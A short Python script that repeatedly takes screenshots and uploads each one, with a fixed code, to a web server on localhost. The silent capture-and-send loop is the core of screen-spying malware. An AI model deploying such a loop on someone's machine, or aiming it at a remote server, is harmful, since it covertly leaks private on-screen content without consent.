import requests
import pyautogui
import os

url = "http://127.0.0.1:5000/"
a = os.getcwd() + "/ab.jpg"
while True:
    pyautogui.screenshot("ab.jpg")
    files = {"file": open(a, "rb")}
    data = {"code": "123456789"}
    if os.path.getsize("ab.jpg") > 10000:
        requests.post(url, files=files, data=data)
